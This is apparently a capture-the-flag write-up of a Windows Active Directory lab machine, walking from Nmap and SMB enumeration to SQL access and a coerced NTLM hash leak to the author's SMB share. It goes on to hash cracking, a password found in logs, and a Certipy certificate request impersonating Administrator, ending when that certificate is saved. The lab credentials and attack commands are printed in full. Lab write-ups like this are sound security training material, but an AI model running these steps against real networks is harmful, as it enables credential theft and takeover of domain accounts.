OS: Windows
Difficulty: Medium
IP: `10.10.11.202`
## Enumeration
**Nmap**
```bash
nmap -p- -Pn -sCV --min-rate 10000 $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-23 18:57 EDT
Nmap scan report for 10.10.11.202
Host is up (0.054s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-24 06:58:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-24T06:59:40+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-04-24T06:59:40+00:00; +7h59m59s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-04-24T06:59:40+00:00; +7h59m59s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-04-24T06:51:57
|_Not valid after:  2054-04-24T06:51:57
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-04-24T06:59:40+00:00; +7h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-04-24T06:59:40+00:00; +7h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
51499/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-24T06:59:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.05 seconds
```

This machine has ports 53 (DNS), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP), 445 (SMB), 1433 (MSSQL) and 5985 (WinRM) open, within others.

Moving on, we can use `crackmapexec` on the smb protocol, as well as `smbclient` to connect to any open remote shares.

```bash
crackmapexec smb $IP --shares -u 'Anonymous' -p ''
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\Anonymous: 
SMB         10.10.11.202    445    DC               [+] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark                                                    
SMB         10.10.11.202    445    DC               -----           -----------     ------                                                    
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin                                              
SMB         10.10.11.202    445    DC               C$                              Default share                                             
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC                                                
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share                                        
SMB         10.10.11.202    445    DC               Public          READ                                                                      
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```

```bash
smbclient -L //$IP      
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.202 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

After connecting to the remote public share that it is readable I found a file `SQL Server Procedures.pdf`. I then downloaded the file to be analyzed, from here i found the user: `brandon`

![[Pasted image 20240423191535.png]]

In this PDF, as can be seen above we find credentials for the SQL server.
`PublicUser`:`GuestUserCantWrite1`

Next, I used `impacket-mssqlclient` to inspect the database.
```bash
$ impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```

## Foothold

One thing we can do here is run `xp_dirtree` to list the contents of a controlled SMB share, so that we can get the NTLMv2 hash and try to crack it afterwards. Let’s set up the SMB server:

Starting an **smbserver** using `impacket`:
```bash
impacket-server smbFolder $(pwd) -smb2support
```

Now from the SQL server:
```bash
SQL> EXEC xp_dirtree '\\10.10.14.40\smbFolder', 1, 1
```

With the impacket SMB server running, we then receive the hash for the `sql_svc` user. After running hashcat on this has using hashcat:

```bash
hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt 
hashcat (v6.2.6) starting

[SNIP] ...
.
.
[SNIP]

SQL_SVC::sequel:aaaaaaaaaaaaaaaa:daae76859e787e6d522ad6ddca545413:010100000000000000a0c76ed595da019d623090839fe4e300000000010010004900520050006a00770064007a006100030010004900520050006a00770064007a006100020010007a004d004d0051007100730079007800040010007a004d004d00510071007300790078000700080000a0c76ed595da01060004000200000008003000300000000000000000000000003000002c635dc16a7c3a57e9a209a1686c198f558ed3645c13ac6073673c3f32e0a4720a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340030000000000000000000:REGGIE1234ronnie
```

Password Found: `REGGIE1234ronnie`

User found on the system:
```powershell
dir C:\Users\
Administrator
Public
Ryan.Cooper
```

After looking at the base of the system we then find a `SQLServer` folder with a Logs directory. This contains the login information for `Ryan.Cooper` in the last couple lines. It looks like he entered in his information wrong the first time, then incidentally put his password in as his username... Thus showing us the password in cleartext in the error logs.

```
[SNIP] ...
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
... [SNIP]
```
`Ryan.Cooper`:`NuclearMosquito3`

After logging in as `Ryan.Cooper` via `evil-winrm` and checking privileges with `whoami /all`/`whoami /priv` I didn't find anything useful. So from here I decided to run `winpeas.exe` on the host to search for any possible privilege escalation vectors.

At this point, it should be noted that on Windows domains, it's import to look for Active Directory Certificate Services(ADCS). A quick way to check for this is using `crackmapexec`.
```bash
crackmapexec ldap $IP -u ryan.cooper -p NuclearMosquito3 -M adcs
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.202    636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
ADCS                                                Found PKI Enrollment Server: dc.sequel.htb                                                
ADCS                                                Found CN: sequel-DC-CA
```


#### AD Certificate Attack
##### Components of a Certificate
- Subject, denotes owner
- Public Key, paired with a private key to link cert to its owner
- Validity period
- SerialNumber
- Issuer CertAuthority
- SubjectAltenativeName, allows for additional names for suubject, enhancing identification
- Basic Constrains, whether the cert if for a CA or an end entity and define usage restrictions
- Extended Key Usages (EKUs) delineate the certificate's specific purposes, like code signing or email encryption through Object Identifier
- Signature Algorithm
- The signature itself
##### Special Considerations

- **Subject Alternative Names (SANs)** expand a certificate's applicability to multiple identities, crucial for servers with multiple domains. Secure issuance processes are vital to avoid impersonation risks by attackers manipulating the SAN specification.
##### Certificate Authorities (CAs) in Active Directory (AD)

AD CS acknowledges CA certificates in an AD forest through designated containers, each serving unique roles:

- **Certification Authorities** container holds trusted root CA certificates.
- **Enrolment Services** container details Enterprise CAs and their certificate templates.
- **NTAuthCertificates** object includes CA certificates authorized for AD authentication.
- **AIA (Authority Information Access)** container facilitates certificate chain validation with intermediate and cross CA certificates.


##### Certificate Acquisition: Client Certificate Request Flow
- Begins with clients finding an enterprise CA
- A CSR is created, containing a public key among other details, after generatinga  public-privaet key pair.
- The CA assesses the CSR against available certificate templates, issuing the certificate based on the template's permissions.
- Upon approval, the CA signs the certificate with its private key and returns it to the client.

##### Certificate Templates

Defined within AD, these templates outline the settings and permissions for issuing certificates, including permitted EKUs and enrollment or modification rights, critical for managing access to certificate services.

Boring... I know...

I will be using [Certipy](https://github.com/ly4k/Certipy) for privilege escalation as the Administrator.

```bash
Certipy v4.0.0 - by Oliver Lyak (ly4k)

usage: certipy [-v] [-h] {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template} ...

Active Directory Certificate Services enumeration and abuse

positional arguments:
  {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template}
                        Action
    account             Manage user and machine accounts
    auth                Authenticate using certificates
    ca                  Manage CA and certificates
    cert                Manage certificates and private keys
    find                Enumerate AD CS
    forge               Create Golden Certificates
    ptt                 Inject TGT for SSPI authentication
    relay               NTLM Relay to AD CS HTTP Endpoints
    req                 Request certificates
    shadow              Abuse Shadow Credentials for account takeover
    template            Manage certificate templates

optional arguments:
  -v, --version         Show Certipy's version number and exit
  -h, --help            Show this help message and exit
```

```bash
certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target $IP -template UserAuthentication -upn Administrator@sequel.htb -dns dc.sequel.htb -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'SEQUEL.HTB' at '75.76.160.3'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 14
[*] Got certificate with multiple identifications
    UPN: 'Administrator@sequel.htb'
    DNS Host Name: 'dc.sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_dc.pfx'
```


